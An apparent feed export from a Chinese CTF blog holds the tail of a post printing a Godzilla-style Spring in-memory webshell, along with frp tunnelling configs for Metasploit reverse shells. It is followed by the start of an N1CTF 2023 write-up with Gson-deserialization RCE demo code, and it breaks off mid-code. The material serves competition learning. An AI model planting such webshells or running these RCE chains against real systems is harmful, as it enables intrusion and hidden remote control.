base64;</span><br><span class="line">        <span class="type">byte</span>[] value = <span class="literal">null</span>;</span><br><span class="line">        <span class="keyword">try</span> &#123;</span><br><span class="line">            base64 = Class.forName(<span class="string">&quot;java.util.Base64&quot;</span>);</span><br><span class="line">            <span class="type">Object</span> <span class="variable">decoder</span> <span class="operator">=</span> base64.getMethod(<span class="string">&quot;getDecoder&quot;</span>, <span class="literal">null</span>).invoke(base64, <span class="literal">null</span>);</span><br><span class="line">            value = (<span class="type">byte</span>[]) decoder.getClass().getMethod(<span class="string">&quot;decode&quot;</span>, <span class="keyword">new</span> <span class="title class_">Class</span>[]&#123;String.class&#125;).invoke(decoder, <span class="keyword">new</span> <span class="title class_">Object</span>[]&#123;bs&#125;);</span><br><span class="line">        &#125; <span class="keyword">catch</span> (Exception e) &#123;</span><br><span class="line">            <span class="keyword">try</span> &#123;</span><br><span class="line">                base64 = Class.forName(<span class="string">&quot;sun.misc.BASE64Decoder&quot;</span>);</span><br><span class="line">                <span class="type">Object</span> <span class="variable">decoder</span> <span class="operator">=</span> base64.newInstance();</span><br><span class="line">                value = (<span class="type">byte</span>[]) decoder.getClass().getMethod(<span class="string">&quot;decodeBuffer&quot;</span>, <span class="keyword">new</span> <span class="title class_">Class</span>[]&#123;String.class&#125;).invoke(decoder, <span class="keyword">new</span> <span class="title class_">Object</span>[]&#123;bs&#125;);</span><br><span class="line">            &#125; <span class="keyword">catch</span> (Exception e2) &#123;</span><br><span class="line">            &#125;</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="keyword">return</span> value;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="meta">@Override</span></span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">void</span> <span class="title function_">transform</span><span class="params">(DOM document, SerializationHandler[] handlers)</span> <span class="keyword">throws</span> TransletException &#123;</span><br><span class="line"></span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="meta">@Override</span></span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">void</span> <span class="title function_">transform</span><span class="params">(DOM document, DTMAxisIterator iterator, SerializationHandler handler)</span> <span class="keyword">throws</span> TransletException &#123;</span><br><span class="line"></span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">static</span>&#123;</span><br><span class="line">        <span class="keyword">try</span>&#123;</span><br><span class="line">            md5 = md5(pass + xc);</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">            <span class="type">WebApplicationContext</span> <span class="variable">context</span> <span class="operator">=</span> (WebApplicationContext) RequestContextHolder.currentRequestAttributes().getAttribute(<span class="string">&quot;org.springframework.web.servlet.DispatcherServlet.CONTEXT&quot;</span>, <span class="number">0</span>);</span><br><span class="line"></span><br><span class="line">            <span class="type">RequestMappingHandlerMapping</span> <span class="variable">mappingHandlerMapping</span> <span class="operator">=</span> context.getBean(RequestMappingHandlerMapping.class);</span><br><span class="line">            <span class="type">Field</span> <span class="variable">configField</span> <span class="operator">=</span> mappingHandlerMapping.getClass().getDeclaredField(<span class="string">&quot;config&quot;</span>);</span><br><span class="line">            configField.setAccessible(<span class="literal">true</span>);</span><br><span class="line">            RequestMappingInfo.<span class="type">BuilderConfiguration</span> <span class="variable">config</span> <span class="operator">=</span> (RequestMappingInfo.BuilderConfiguration) configField.get(mappingHandlerMapping);</span><br><span class="line">            <span class="type">Method</span> <span class="variable">readmethod</span> <span class="operator">=</span> gsl.class.getMethod(<span class="string">&quot;ls1&quot;</span>, HttpServletRequest.class,HttpServletResponse.class);</span><br><span class="line"></span><br><span class="line">            <span class="type">RequestMappingInfo</span> <span class="variable">info</span> <span class="operator">=</span> RequestMappingInfo.paths(<span class="string">&quot;/ls1&quot;</span>).options(config).build();</span><br><span class="line">            <span class="type">gsl</span> <span class="variable">readfile_inject</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">gsl</span>();</span><br><span class="line">            mappingHandlerMapping.registerMapping(info,readfile_inject,readmethod);</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">        &#125;<span class="keyword">catch</span> (Exception e)&#123;</span><br><span class="line">            e.printStackTrace();</span><br><span class="line">        &#125;</span><br><span class="line"></span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">void</span> <span class="title function_">ls1</span><span class="params">(HttpServletRequest request,HttpServletResponse response)</span> <span class="keyword">throws</span> Exception &#123;</span><br><span class="line">        <span class="type">byte</span>[] data=base64Decode(request.getParameter(pass));</span><br><span class="line">        data=x(data, <span class="literal">false</span>);</span><br><span class="line">        <span class="keyword">try</span>&#123;</span><br><span class="line">        <span class="type">HttpSession</span> <span class="variable">session</span> <span class="operator">=</span> request.getSession();</span><br><span class="line">        <span class="keyword">if</span> (session.getAttribute(<span class="string">&quot;payload&quot;</span>)==<span class="literal">null</span>)&#123;</span><br><span class="line">            session.setAttribute(<span class="string">&quot;payload&quot;</span>,defineClass(data));</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">        &#125;<span class="keyword">else</span> &#123;</span><br><span class="line">            request.setAttribute(<span class="string">&quot;parameters&quot;</span>,data);</span><br><span class="line">            java.io.ByteArrayOutputStream arrOut=<span class="keyword">new</span> <span class="title class_">java</span>.io.ByteArrayOutputStream();</span><br><span class="line">            Object f=((Class)session.getAttribute(<span class="string">&quot;payload&quot;</span>)).newInstance();</span><br><span class="line">            f.equals(arrOut);</span><br><span class="line">            f.equals(request);</span><br><span class="line">            response.getWriter().write(md5.substring(<span class="number">0</span>,<span class="number">16</span>));</span><br><span class="line">            f.toString();</span><br><span class="line">            response.getWriter().write(base64Encode(x(arrOut.toByteArray(), <span class="literal">true</span>)));</span><br><span class="line">            response.getWriter().write(md5.substring(<span class="number">16</span>));&#125;</span><br><span class="line">        &#125;</span><br><span class="line">    <span class="keyword">catch</span> (Exception e)&#123;&#125;</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"></span><br><span class="line">        &#125;</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"></span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"></span><br><span class="line"></span><br><span class="line"></span><br><span class="line"></span><br><span class="line"></span><br></pre></td></tr></table></figure><p>看着眼熟吗，没错，就是 godzilla🐎.</p><p>👴在广为流传的 Spring 内存🐎的基础上，引入了 godzilla🐎的逻辑.</p><h1 id="kali_tips"><span id="kali_tips"> kali_tips</span></h1><p>之后进行一波 MSF 上线，什么，你说 kali 不出网，没法反弹 shell?👴来告诉你怎么办.</p><p>首先你需要一个公网 IP,🤣🤣🤣🤣🤣</p><p>公网上起个 frps,frps.ini 如下</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br></pre></td><td class="code"><pre><span class="line">[common]</span><br><span class="line">bind_port = <span class="number">7000</span></span><br><span class="line">dashboard_user = <span class="type">admin</span></span><br><span class="line"><span class="variable">dashboard_pwd</span> <span class="operator">=</span> frpadmin@<span class="number">2023</span></span><br><span class="line">dashboard_port = <span class="number">7500</span></span><br><span class="line">heartbeat_timeout = <span class="number">30</span></span><br><span class="line">token=frpToken<span class="meta">@admin2023</span></span><br><span class="line">[common]</span><br><span class="line">server_addr = your_ip<span class="comment">//这个ip是以目标靶机能访问到为准</span></span><br><span class="line">server_port = <span class="number">7000</span></span><br><span class="line">vhost_http_port = <span class="number">9001</span></span><br><span class="line">vhost_ssh_port = <span class="number">9002</span></span><br><span class="line">vhost_tcp_port = <span class="number">9003</span></span><br><span class="line"></span><br></pre></td></tr></table></figure><p>然后确保 kali 能访问你的公网 ip, 接着 kali 起 frpc, 配置如下</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br></pre></td><td class="code"><pre><span class="line"></span><br><span class="line">[common]</span><br><span class="line">server_addr = ip<span class="comment">//这个ip以kali能访问到为准</span></span><br><span class="line"></span><br><span class="line">server_port = <span class="number">7000</span>          </span><br><span class="line">token = frpToken<span class="meta">@admin2023</span> </span><br><span class="line"></span><br><span class="line"></span><br><span class="line">[web]</span><br><span class="line">type = <span class="type">http</span></span><br><span class="line"><span class="variable">local_ip</span> <span class="operator">=</span> <span class="number">0.0</span><span class="number">.0</span><span class="number">.0</span></span><br><span class="line">local_port = <span class="number">80</span>   </span><br><span class="line">custom_domains = <span class="type">ip</span></span><br><span class="line"><span class="variable">remote_port</span> <span class="operator">=</span> <span class="number">9001</span> </span><br><span class="line"></span><br><span class="line">#kali ssh</span><br><span class="line">[ssh]</span><br><span class="line">type = <span class="type">tcp</span></span><br><span class="line"><span class="variable">local_ip</span> <span class="operator">=</span> <span class="number">0.0</span><span class="number">.0</span><span class="number">.0</span></span><br><span class="line">local_port = <span class="number">22</span></span><br><span class="line">custom_domains = <span class="type">ip</span></span><br><span class="line"><span class="variable">remote_port</span> <span class="operator">=</span> <span class="number">9002</span>  </span><br><span class="line"></span><br><span class="line">#tcp msfconsole</span><br><span class="line">[tcp]</span><br><span class="line">type = <span class="type">tcp</span></span><br><span class="line"><span class="variable">local_ip</span> <span class="operator">=</span> <span class="number">0.0</span><span class="number">.0</span><span class="number">.0</span></span><br><span class="line">local_port = <span class="number">9003</span></span><br><span class="line">custom_domains = <span class="type">ip</span></span><br><span class="line"><span class="variable">remote_port</span> <span class="operator">=</span> <span class="number">9003</span></span><br><span class="line"></span><br></pre></td></tr></table></figure><p>这里要注意到的是，frps 的服务 ip 和 frpc 的服务 ip 不一样.</p><p>在渗透的时候，往往是 windows 主机进入局域网，kali 不进，那么 frps 的 ip 配置就要以主机在局域网 ip 为准，而 frpc 的 ip 配置，以 NAT 模式配置的局域网为准.</p><p>然后 msf 生成反弹 shell 监听上线啥的就不成问题，不过 ip 要设置成映射后的 ip.</p>]]></content>
    
    
      
      
    <summary type="html">&lt;link rel=&quot;stylesheet&quot; class=&quot;aplayer-secondary-style-marker&quot; href=&quot;&#92;assets&#92;css&#92;APlayer.min.css&quot;&gt;&lt;script src=&quot;&#92;assets&#92;js&#92;APlayer.min.js&quot; cla</summary>
      
    
    
    
    
    <category term="CTF" scheme="https://1llustrious.github.io/tags/CTF/"/>
    
  </entry>
  
  <entry>
    <title>N1CTF_复现</title>
    <link href="https://1llustrious.github.io/2023/12/01/N1CTF-%E5%A4%8D%E7%8E%B0/"/>
    <id>https://1llustrious.github.io/2023/12/01/N1CTF-%E5%A4%8D%E7%8E%B0/</id>
    <published>2023-12-01T00:48:46.000Z</published>
    <updated>2023-12-02T11:42:23.111Z</updated>
    
    <content type="html"><![CDATA[<link rel="stylesheet" class="aplayer-secondary-style-marker" href="\assets\css\APlayer.min.css"><script src="\assets\js\APlayer.min.js" class="aplayer-secondary-script-marker"></script><!-- toc --><ul><li><a href="#%E5%86%99%E5%9C%A8%E5%89%8D%E9%9D%A2">写在前面</a></li><li><a href="#strangeport">StrangePort</a><ul><li><a href="#%E5%88%86%E6%9E%90">分析🤔</a></li><li><a href="#gtmdapachemq">gtmdapachemq</a><ul><li><a href="#%E7%8E%AF%E5%A2%83%E6%90%AD%E5%BB%BA">环境搭建</a></li></ul></li><li><a href="#%E6%B5%81%E7%A8%8B%E5%88%86%E6%9E%90">流程分析</a><ul><li><a href="#%E5%88%86%E6%9E%90%E5%A6%82%E4%BD%95%E5%88%A9%E7%94%A8%E5%88%B0createthrowable">分析如何利用到 createThrowable😊</a><ul><li><a href="#java-message-servicejms">Java Message Service(JMS)</a></li></ul></li></ul></li><li><a href="#%E6%89%93tmd%E9%A2%98%E7%9B%AE">打 tmd 题目😡</a></li></ul></li><li><a href="#ez_maria">ez_maria</a><ul><li><a href="#%E6%BA%90%E7%A0%81%E5%88%86%E6%9E%90">源码分析</a></li><li><a href="#udf%E5%86%99so">UDF 写 so🤪</a></li><li><a href="#%E7%89%9B%E9%AD%94%E7%9A%84%E4%BB%80%E4%B9%88%E4%BA%8Bcapabilities%E6%9D%83%E9%99%90">牛魔的什么事 capabilities 权限😓</a></li><li><a href="#%E5%85%B6%E4%B8%80">其一</a></li><li><a href="#%E5%85%B6%E4%BA%8C">其二</a></li><li><a href="#%E5%8A%AB%E6%8C%81php">劫持 php</a></li></ul></li><li><a href="#ytiruces">ytiruces</a></li><li><a href="#ggbonds-gogs">ggbond’s gogs</a></li><li><a href="#dockerdebug">dockerdebug</a></li></ul><!-- tocstop --><h1 id="写在前面"><span id="写在前面"> 写在前面</span></h1><p>太顶了这比赛，还得复现学很多东西.</p><p>环境:</p><p><a href="https://github.com/Nu1LCTF/n1ctf-2023">GitHub - Nu1LCTF/n1ctf-2023</a></p><p>参考:</p><p>[N1CTF 2023 Web 赛后复现 Writeup - Boogiepop Doesn’t Laugh (<a href="http://boogipop.com">boogipop.com</a>)](<a href="https://boogipop.com/2023/11/06/N1CTF">https://boogipop.com/2023/11/06/N1CTF</a> 2023 Web 赛后复现 Writeup/#StrangePort)</p><p>[N1CTF 2023 writeup (<a href="http://qq.com">qq.com</a>)](<a href="https://mp.weixin.qq.com/s/HQgtWIVNFyt-uN-tJDTXAw#:~:text=ggbond's">https://mp.weixin.qq.com/s/HQgtWIVNFyt-uN-tJDTXAw#:~:text=ggbond’s</a> ggos)</p><p><a href="https://mp.weixin.qq.com/s/uT7mPEoD2BRofuyDrOanZQ">2023n1ctf wp (qq.com)</a>  DJB!!!😝🥰</p><p>我可太喜欢大 B 老师了🥵, 受不了！！！1, 爆了！</p><h1 id="strangeport"><span id="strangeport"> StrangePort</span></h1><p>开了个服务，通过 nginx 反代，题目不出网，md 就这么想恶心👴吗😅</p><p><img src="/2023/12/01/N1CTF-%E5%A4%8D%E7%8E%B0/1699269926760-1701391479085-3.png" alt="1699269926760"></p><p>题目给的 controller</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">//</span></span><br><span class="line"><span class="comment">// Source code recreated from a .class file by IntelliJ IDEA</span></span><br><span class="line"><span class="comment">// (powered by FernFlower decompiler)</span></span><br><span class="line"><span class="comment">//</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">package</span> com.api;</span><br><span class="line"></span><br><span class="line"><span class="keyword">import</span> com.google.gson.Gson;</span><br><span class="line"><span class="keyword">import</span> java.nio.charset.StandardCharsets;</span><br><span class="line"><span class="keyword">import</span> java.util.Base64;</span><br><span class="line"><span class="keyword">import</span> org.springframework.web.bind.annotation.GetMapping;</span><br><span class="line"><span class="keyword">import</span> org.springframework.web.bind.annotation.PathVariable;</span><br><span class="line"><span class="keyword">import</span> org.springframework.web.bind.annotation.RequestMapping;</span><br><span class="line"><span class="keyword">import</span> org.springframework.web.bind.annotation.RestController;</span><br><span class="line"></span><br><span class="line"><span class="meta">@RestController</span></span><br><span class="line"><span class="meta">@RequestMapping(&#123;&quot;/api&quot;&#125;)</span></span><br><span class="line"><span class="keyword">public</span> <span class="keyword">class</span> <span class="title class_">APIController</span> &#123;</span><br><span class="line">    <span class="keyword">public</span> <span class="title function_">APIController</span><span class="params">()</span> &#123;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="meta">@GetMapping(&#123;&quot;/&quot;&#125;)</span></span><br><span class="line">    <span class="keyword">public</span> String <span class="title function_">index</span><span class="params">()</span> <span class="keyword">throws</span> Exception &#123;</span><br><span class="line">        <span class="keyword">return</span> <span class="string">&quot;try /api/com.api.Person/eyJuYW1lIjoidXNlciIsImFnZSI6IjIwIn0=&quot;</span>;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="meta">@GetMapping(&#123;&quot;/&#123;Person&#125;/&#123;Json&#125;&quot;&#125;)</span></span><br><span class="line">    <span class="keyword">public</span> Person <span class="title function_">handleApiRequest</span><span class="params">(<span class="meta">@PathVariable</span> String Person, <span class="meta">@PathVariable</span> String Json)</span> <span class="keyword">throws</span> Exception &#123;</span><br><span class="line">        <span class="type">Gson</span> <span class="variable">gson</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">Gson</span>();</span><br><span class="line">        <span class="type">Person</span> <span class="variable">person</span> <span class="operator">=</span> (Person)gson.fromJson(<span class="keyword">new</span> <span class="title class_">String</span>(Base64.getDecoder().decode(Json), StandardCharsets.UTF_8), Class.forName(Person));</span><br><span class="line">        <span class="keyword">return</span> person;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br></pre></td></tr></table></figure><p>用自己√Ⅷ 想想都知道要通过 Gson 打一个 RCE.</p><h2 id="分析"><span id="分析"> 分析🤔</span></h2><p>不多说，先 debug 看一下能不能出点什么信息.</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">import</span> com.api.Person;</span><br><span class="line"><span class="keyword">import</span> com.google.gson.Gson;</span><br><span class="line"></span><br><span class="line"><span class="keyword">import</span> java.lang.reflect.InvocationTargetException;</span><br><span class="line"><span class="keyword">import</span> java.nio.charset.StandardCharsets;</span><br><span class="line"><span class="keyword">import</span> java.util.Base64;</span><br><span class="line"></span><br><span class="line"><span class="keyword">public</span> <span class="keyword">class</span> <span class="title class_">GsonDemo</span> &#123;</span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">void</span> <span class="title function_">main</span><span class="params">(String[] args)</span> <span class="keyword">throws</span> NoSuchMethodException, InvocationTargetException, InstantiationException, IllegalAccessException, ClassNotFoundException, IOException &#123;</span><br><span class="line">        String Json=<span class="string">&quot;eyJscGNBbGxDb20iOlsidG91Y2ggL3RtcC9hYWFhYSIsInRvdWNoIC90bXAvYWFhYWEiXX0=&quot;</span>;</span><br><span class="line">        String Person=<span class="string">&quot;Person&quot;</span>;</span><br><span class="line">        <span class="type">Gson</span> <span class="variable">gson</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">Gson</span>();</span><br><span class="line">        com.api.<span class="type">Person</span> <span class="variable">o</span> <span class="operator">=</span> (Person) gson.fromJson(<span class="keyword">new</span> <span class="title class_">String</span>(Base64.getDecoder().decode(Json), StandardCharsets.UTF_8), Class.forName(Person));</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"><span class="comment">//</span></span><br></pre></td></tr></table></figure><p>随便给个 base64</p><p>来个 Person😤</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br></pre></td><td class="code"><pre><span class="line"> <span class="keyword">public</span> <span class="keyword">class</span> <span class="title class_">Person</span> &#123;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">public</span> <span class="title function_">Person</span><span class="params">()</span> &#123;</span><br><span class="line">        System.out.println(<span class="number">1111</span>);</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">public</span> <span class="type">String</span> <span class="variable">name</span> <span class="operator">=</span> <span class="string">&quot;john&quot;</span>;</span><br><span class="line">    <span class="keyword">public</span> <span class="type">String</span> <span class="variable">age</span> <span class="operator">=</span> <span class="string">&quot;11&quot;</span>;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">public</span> String <span class="title function_">toString</span><span class="params">()</span> &#123;</span><br><span class="line">        <span class="keyword">return</span> <span class="string">&quot;Person&#123;name=&#x27;&quot;</span> + <span class="built_in">this</span>.name + <span class="string">&quot;&#x27;, age=&#x27;&quot;</span> + <span class="built_in">this</span>.age + <span class="string">&quot;&#x27;&#125;&quot;</span>;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">public</span> <span class="title function_">Person</span><span class="params">(String name, String age)</span> &#123;</span><br><span class="line">        <span class="built_in">this</span>.name = name;</span><br><span class="line">        <span class="built_in">this</span>.age = age;</span><br><span class="line">    &#125;</span><br><span class="line">    Object <span class="title function_">writeReplace</span><span class="params">()</span> &#123;</span><br><span class="line">        System.out.println(<span class="string">&#x27;1&#x27;</span>);</span><br><span class="line">        <span class="keyword">return</span> <span class="number">1</span>;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">public</span> String <span class="title function_">getName</span><span class="params">()</span> &#123;</span><br><span class="line">        <span class="keyword">return</span> <span class="built_in">this</span>.name;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">void</span> <span class="title function_">setName</span><span class="params">(String name)</span> &#123;</span><br><span class="line">        <span class="built_in">this</span>.name = name;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">public</span> String <span class="title function_">getAge</span><span class="params">()</span> &#123;</span><br><span class="line">        <span class="keyword">return</span> <span class="built_in">this</span>.age;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">void</span> <span class="title function_">setAge</span><span class="params">(String age)</span> &#123;</span><br><span class="line">        <span class="built_in">this</span>.age = age;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"></span><br></pre></td></tr></table></figure><p><img src="/2023/12/01/N1CTF-%E5%A4%8D%E7%8E%B0/1699271070059.png" alt="1699271070059"></p><p>可以看到有构造方法，就会去调用，没有的话，就会调用 Unsafe 实例化.</p><p>所以，思考一下怎么通过 construct 到 RCE.😤</p><p>这里就可以尝试用一个 <code>PrintServiceLookupProvider</code> , 事实上只要实现了 <code>PrintServiceLookup</code>  类的都行.</p><p><img src="/2023/12/01/N1CTF-%E5%A4%8D%E7%8E%B0/1699271625715-1701391479085-4.png" alt="1699271625715"></p><p>写个 demo 去调试一下🤣</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">import</span> java.io.IOException;</span><br><span class="line"></span><br><span class="line"><span class="keyword">public</span> <span class="keyword">class</span> <span class="title class_">Person</span> &#123;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">public</span> <span class="title function_">Person</span><span class="params">()</span> <span class="keyword">throws</span> IOException &#123;</span><br><span class="line">        Runtime.getRuntime().exec(<span class="string">&quot;whoami&quot;</span>+age);</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">public</span> <span class="type">String</span> <span class="variable">name</span> <span class="operator">=</span> <span class="string">&quot;john&quot;</span>;</span><br><span class="line">    <span class="keyword">public</span> <span class="type">String</span> <span class="variable">age</span> <span class="operator">=</span> <span class="string">&quot;11&quot;</span>;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">public</span> String <span class="title function_">toString</span><span class="params">()</span> &#123;</span><br><span class="line">        <span class="keyword">return</span> <span class="string">&quot;Person&#123;name=&#x27;&quot;</span> + <span class="built_in">this</span>.name + <span class="string">&quot;&#x27;, age=&#x27;&quot;</span> + <span class="built_in">this</span>.age + <span class="string">&quot;&#x27;&#125;&quot;</span>;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">public</span> <span class="title function_">Person</span><span class="params">(String name, String age)</span> &#123;</span><br><span class="line">        <span class="built_in">this</span>.name = name;</span><br><span class="line">        <span class="built_in">this</span>.age = age;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">public</span> String <span class="title function_">getName</span><span class="params">()</span> &#123;</span><br><span class="line">        <span class="keyword">return</span> <span class="built_in">this</span>.name;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">void</span> <span class="title function_">setName</span><span class="params">(String name)</span> &#123;</span><br><span class="line">        <span class="built_in">this</span>.name = name;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">public</span> String <span class="title function_">getAge</span><span class="params">()</span> &#123;</span><br><span class="line">        <span class="keyword">return</span> <span class="built_in">this</span>.age;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">void</span> <span class="title function_">setAge</span><span class="params">(String age)</span> &#123;</span><br><span class="line">        <span class="built_in">this</span>.age = age;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br></pre></td></tr></table></figure><p>尝试命令拼接</p><p>不出意外地出意外了😅😓</p><p>大 B 老师说，PrintService 是会新建一个线程，进行一个重复循环如下</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">import</span> java.io.IOException;</span><br><span class="line"><span class="keyword">import</span> java.io.Writer;</span><br><span class="line"></span><br><span class="line"><span class="keyword">public</span> <span class="keyword">class</span> <span class="title class_">Person</span> &#123;</span><br><span class="line">    <span class="keyword">class</span> <span class="title class_">RceThread</span> <span class="keyword">implements</span> <span class="title class_">Runnable</span>&#123;</span><br><span class="line">        <span class="meta">@Override</span></span><br><span class="line">        <span class="keyword">public</span> <span class="keyword">void</span> <span class="title function_">run</span><span class="params">()</span> &#123;</span><br><span class="line">            <span class="keyword">while</span> (<span class="literal">true</span>) &#123;</span><br><span class="line">                <span class="keyword">try</span> &#123;</span><br><span class="line">                    Runtime.getRuntime().exec(age);</span><br><span class="line">                &#125; <span class="keyword">catch</span> (IOException e) &#123;</span><br><span class="line">                    <span class="keyword">throw</span> <span 